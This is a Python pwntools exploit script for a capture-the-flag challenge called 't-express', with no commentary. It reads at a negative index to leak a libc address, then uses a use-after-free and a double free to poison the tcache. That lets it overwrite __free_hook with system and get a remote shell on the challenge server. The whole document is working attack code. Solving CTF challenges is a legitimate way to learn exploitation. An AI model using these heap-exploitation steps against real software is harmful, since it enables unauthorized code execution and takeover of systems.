from pwn import *;

libc = ELF("./libc.so.6", checksec=False)

def buy(package, fname, lname):
    p.sendlineafter("choice: ", "1")
    p.sendlineafter("): ", str(package))
    p.sendafter("First name: ", fname)
    p.sendafter("Last name: ", lname)

def view(index):
    p.sendlineafter("choice: ", "2")
    p.sendlineafter("ticket: ", str(index))
    p.recvuntil("name |")

def use(index, opt=None):
    p.sendlineafter("choice: ", "3")
    p.sendlineafter("ticket: ", str(index))
    if opt:
        p.sendlineafter("4): ", str(opt))

p = remote('t-express.sstf.site', 1337)

buy(1, "A", "A") # 0
buy(1, "A", "A") # 1
buy(1, "A", "A") # 2

view(-8)

tmp = p.recv(11)
tmp = p.recv(6)
libc_base = u64(tmp.ljust(8, b"\x00")) - 0x1ec723
print("libc_base: " + hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']

use(2) # 2
use(1) # 1
use(0) # 0

buy(1, "A", "A"*8) # 0=3, overwrite 1

use(3, 4) # free 0=3
use(1) # double free

buy(1, p64(free_hook), "A") # 4
buy(1, "/bin/sh", "A") # 5
buy(1, p64(libc_base + libc.symbols['system']), "A") # 6

use(5)

p.interactive()
